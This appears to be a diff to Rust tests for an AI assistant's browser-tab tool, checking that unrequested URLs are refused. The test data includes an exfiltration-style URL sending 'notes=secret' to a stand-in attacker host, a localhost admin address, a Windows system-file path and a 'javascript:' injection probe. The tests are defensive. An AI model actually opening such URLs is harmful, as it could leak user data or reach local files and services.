@@ -168,9 +168,17 @@ async fn navigate_opens_a_tab_from_a_link_the_person_gave_a_search_or_a_site_the
     let r = call(&mut t, TABS, json!({ "action": "new", "url": "https://evil.example/?notes=secret" }), &log).await.result;
     assert_eq!(r["displayText"], "Didn't bring up evil.example/?notes=secret: not a link from you or the search");
     // Never this PC, another scheme or nothing.
-    for (url, why) in [("http://127.0.0.1/admin", "never opens addresses on this PC"), ("file:///C:/Windows/win.ini", "only opens web pages"), ("", "url or search is required")] {
+    for (url, why) in [("http://127.0.0.1/admin", "never opens addresses on this PC"), ("file:///C:/Windows/win.ini", "not a web page"), ("javascript:alert(1)", "only opens web pages"), ("", "url or search is required")] {
         let r = call(&mut t, TABS, json!({ "action": "new", "url": url, "search": "" }), &log).await.result;
         assert!(r["error"].as_str().unwrap_or("").contains(why) || r["error"].as_str().unwrap_or("").contains("needs url or search"), "{url}: {r}");
+    }
+    // A picture file on this PC: never loaded as a page; show_picture shows it (pictures/local.rs).
+    for url in ["file:///C:/Projects/garden-planner/docs/concept.png", "C:\\Projects\\garden-planner\\docs\\concept.png"] {
+        for (tool, args) in [(TABS, json!({ "action": "new", "url": url })), (NAVIGATE, json!({ "url": url }))] {
+            let r = call(&mut t, tool, args, &log).await.result;
+            assert!(r["error"].as_str().unwrap_or("").contains("show_picture"), "{url}: {r}");
+            assert!(r["displayText"].as_str().unwrap_or("").ends_with(" concept.png: a file on this PC"), "{r}");
+        }
     }
     // A named site's home page; words as a search on the person's engine (never read).
     let mut t = turn("Can you open up ExampleTube, then search for train times");
